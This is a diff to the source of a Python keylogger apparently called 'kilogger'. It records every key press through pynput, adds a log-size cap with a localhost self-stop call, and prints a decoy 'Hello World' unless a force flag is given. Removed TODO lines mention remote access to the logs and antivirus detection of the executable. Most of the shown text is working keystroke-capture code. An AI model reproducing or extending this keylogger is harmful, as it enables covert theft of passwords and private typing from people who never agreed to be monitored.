@@ -16,10 +16,6 @@ this tool, and users are responsible for their actions. This project
 is provided "as is" without warranties.
 
 Version: 1.0.0
-
-TODO [ ]: Implement capture copy to clipboard functionality
-TODO [ ]: Remote access to logs
-TODO [ ]: executable gets detected by: see .report
 """
 
 import argparse
@@ -30,6 +26,7 @@ import sys
 import time
 from abc import ABC, abstractmethod
 from threading import Event, Thread
+from logging.handlers import RotatingFileHandler
 
 from kilogger import (CONFIG, DEFAULT_TIMEOUT, LOGLOC, STOP_RESPONSE,
                       install_package, verify_package_installation)
@@ -53,6 +50,15 @@ except ImportError:
     else:
         from pynput.keyboard import Listener
 
+try:
+    import requests
+except ImportError:
+    install_package('requests')
+    if not verify_package_installation('requests'):
+        sys.exit(1)
+    else:
+        import requests
+
 
 class StringToList(argparse.Action):
     """Convert comma-separated string to list"""
@@ -69,6 +75,15 @@ class PathParser(argparse.Action):
         # It should verify that the given path
         # is for a file, not that it already exists
         setattr(namespace, self.dest, value)
+
+
+class AutoDestroyHandler(RotatingFileHandler):
+    """
+    Leverages RotatingFileHandler functionality
+    to stop the logger once maxBytes is reached
+    """
+    def doRollover(self):
+        requests.get('http://127.0.0.1:65432/terminate')
 
 
 class KeyboardManager(ABC):
@@ -103,6 +118,7 @@ class KeyboardListener(Thread):
     def _action(self, key):
         """Called by pynput.keyboard.Listener when a button is pressed"""
         self.__logger.info(f'> {str(key)}')
+        # self.__logger.info()
 
 
 class BaseManager(KeyboardManager):
@@ -312,6 +328,14 @@ def main(argv = None):
         'note: process names should be separated by ", ".'
     )
 
+    parser.add_argument(
+        '--max-bytes',
+        type=int,
+        default=10000,
+        help='Specify the maximum size for logs, defaults to 0.1 MB; '
+             'IMPORTANT, when the limit is reached the logger will stop.'
+    )
+
     args = parser.parse_args(argv[1:])
 
     if ((not (args.force and args.force == 1))
@@ -319,6 +343,7 @@ def main(argv = None):
         print('Hello World')
     else:
         CONFIG['handlers']['file']['filename'] = args.output
+        CONFIG['handlers']['file']['maxBytes'] = args.max_bytes
         logging.config.dictConfig(CONFIG)
 
         # --- Run logger
